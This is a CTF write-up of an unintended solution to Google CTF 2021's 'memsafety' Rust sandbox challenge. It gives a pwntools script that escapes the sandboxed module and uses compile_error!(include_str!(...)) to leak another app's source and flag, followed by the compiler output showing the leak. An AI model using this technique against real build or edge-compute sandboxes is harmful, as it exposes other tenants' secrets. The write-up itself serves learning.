# Memsafety challenge

Task description:
```
Provide a snippet of Rust code to run as an app in our edge compute.
We created a sandbox that doesn't allow any unsafe code and limits
what can be run, so we can be sure the different apps are well
isolated.

⇥Attachment
memsafety.2021.ctfcompetition.com 1337
```
* The task was solved by 49 teams
* The attachment aka the "public" part that the CTF participants got can be seen here: https://github.com/google/google-ctf/tree/master/2021/quals/pwn-memsafety/attachments
* For intended solution and task sources see https://github.com/google/google-ctf/tree/master/2021/quals/pwn-memsafety


# Our unintended solution

TL;DR: We just finished the`pub mod user {` module and created another one that caused the compilation error and was not checked by the AST(?) nodes visitor sandbox/checker.

```python
from pwn import *

code = '''
    pub struct State();
    
    impl State {
        pub fn new() -> prelude::Box<dyn prelude::Service> {
            prelude::Box::new(State())
        }
    }

    impl prelude::Service for State {
        fn handle(&mut self, s: &str) {
            use prelude::*;
            prelude::log!("str={}", s);
        }
    }
}

pub mod bypass{
    pub fn foo() {
        compile_error!(include_str!("../../user-1/src/lib.rs"));
        // prelude::log!("LOL");
    }
'''
code += 'EOF'

if args.REMOTE:
    io = remote(args.HOST or 'memsafety.2021.ctfcompetition.com', args.PORT or 1337)
else:
    io = process('./chal.py')


io.recvuntil('===== Enter partial source for edge compute app (EOF to finish):\n')

io.sendline(code)

#io.shutdown('send')

print(io.recvall().decode())
```


Execution log (local, remote is down already):
```
(pwn) dc@ubuntu:~/gctf/pwn_memsafety$ python s.py 
[+] Starting local process './chal.py': pid 21043
[+] Receiving all data: Done (2.31KB)
[*] Process './chal.py' stopped with exit code 1 (pid 21043)
===== Input accepted!
===== Writing source to disk...
===== Building edge compute app...
   Compiling user-0 v0.1.0 (/home/dc/gctf/pwn_memsafety/sources/user-0)
error: /*
    Copyright 2021 Google LLC

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        https://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
*/
#![no_std]
use proc_sandbox::sandbox;

#[sandbox]
pub mod user {
    static FLAG: &'static str = "CTF{fake flag}";
    use prelude::{mem::ManuallyDrop, Service, Box, String};
    pub struct State(ManuallyDrop<String>);
    impl State {
        pub fn new() -> Box<dyn Service> {
            Box::new(State(ManuallyDrop::new(String::from(FLAG))))
        }
    }
    impl Service for State {
       fn handle(&mut self, _: &str) {}
    }
}

  --> user-0/src/lib.rs:26:9
   |
26 |         compile_error!(include_str!("../../user-1/src/lib.rs"));
   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

warning: unused import: `prelude::*`
  --> user-0/src/lib.rs:18:17
   |
18 |             use prelude::*;
   |                 ^^^^^^^^^^
   |
   = note: `#[warn(unused_imports)]` on by default

error: aborting due to previous error; 1 warning emitted

error: could not compile `user-0`.

To learn more, run the command again with --verbose.
===== non-zero return code on compilation: 101
```
